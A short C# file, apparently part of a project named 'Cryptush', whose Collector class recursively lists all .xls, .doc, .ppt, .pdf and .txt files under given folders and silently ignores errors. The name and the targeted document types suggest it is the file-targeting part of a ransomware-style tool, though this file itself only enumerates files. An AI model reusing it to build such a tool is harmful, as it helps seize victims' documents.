using System;
using System.Collections.Generic;
using System.IO;

namespace Cryptush.lib
{
    class Collector
    {
        public static List<string> Start(string[] paths)
        {
            var files = new List<string> { };
            foreach (string path in paths)
            {
                if (Directory.Exists(path)) { files.AddRange(CollectFromPath(path)); }
            }
            return files;
        }

        public static List<string> CollectFromPath(string path)
        {

            var extensions = new List<string> { ".xls", ".doc", ".ppt", ".pdf", ".txt" };
            var files = new List<string> { };

            foreach (string extension in extensions)
            {
                foreach (string file in Directory.GetFiles(path, string.Format("*{0}", extension), SearchOption.TopDirectoryOnly))
                {
                    files.Add(file);
                }
            }

            foreach (string subDir in Directory.GetDirectories(path))
            {
                try
                {
                    var subDirFiles = CollectFromPath(subDir);
                    foreach (string file in subDirFiles)
                    {
                        files.Add(file);
                    }
                }
                catch
                {
                }
            }
            return files;
        }
    }
}
